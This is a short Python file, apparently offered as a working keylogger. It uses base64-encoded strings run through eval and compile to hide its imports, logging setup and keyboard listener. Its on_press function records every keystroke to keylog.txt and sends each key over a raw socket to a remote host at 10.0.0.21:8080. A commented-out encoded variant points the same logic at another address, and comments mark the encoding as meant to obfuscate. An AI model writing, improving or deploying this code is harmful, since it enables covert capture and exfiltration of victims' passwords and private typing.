import base64

Import = "aW1wb3J0IHNvY2tldApmcm9tIHB5bnB1dC5rZXlib2FyZCBpbXBvcnQgS2V5LCBMaXN0ZW5lcgppbXBvcnQgbG9nZ2luZw=="
A = "bG9nZ2luZy5iYXNpY0NvbmZpZyhmaWxlbmFtZT0oImtleWxvZy50eHQiKSwgbGV2ZWw9bG9nZ2luZy5ERUJVRywgZm9ybWF0PSIgJShhc2N0aW1lKXMgLSAlKG1lc3NhZ2UpcyIp"
# -----------------------------------
#Base64 encoded payload for obfuscate
#B = "ZGVmIG9uX3ByZXNzKGtleSk6CiAgICBsb2dnaW5nLmluZm8oc3RyKGtleSkpCiAgICBsb2dnaW5nLmluZm8oc3RyKGtleSkpCiAgICBtID0gc29ja2V0LnNvY2tldCgpCiAgICBtLmNvbm5lY3QoKCIxMC4wLjIuMTQiLCA4MDgwKSkKICAgIG0uc2VuZChmIntzdHIoa2V5KX0iLmVuY29kZSgpKQ=="
# -----------------------------------
def on_press(key):
    logging.info(str(key))
    logging.info(str(key))
    m = socket.socket()
    m.connect(("10.0.0.21", 8080))
    m.send(f"{str(key)}".encode())
    
C = "d2l0aCBMaXN0ZW5lcihvbl9wcmVzcz1vbl9wcmVzcykgYXMgbGlzdGVuZXIgOgogICAgbGlzdGVuZXIuam9pbigp"

eval(compile(base64.b64decode(Import) , "<string>", 'exec'))
eval(compile(base64.b64decode(A), "<string>", 'exec')) 
# -----------------------------------
# Use it for Obfuscate #
#eval(compile(base64.b64decode(B), "<string>", 'exec')) 
# -----------------------------------
eval(compile(base64.b64decode(C), "<string>", 'exec')) 
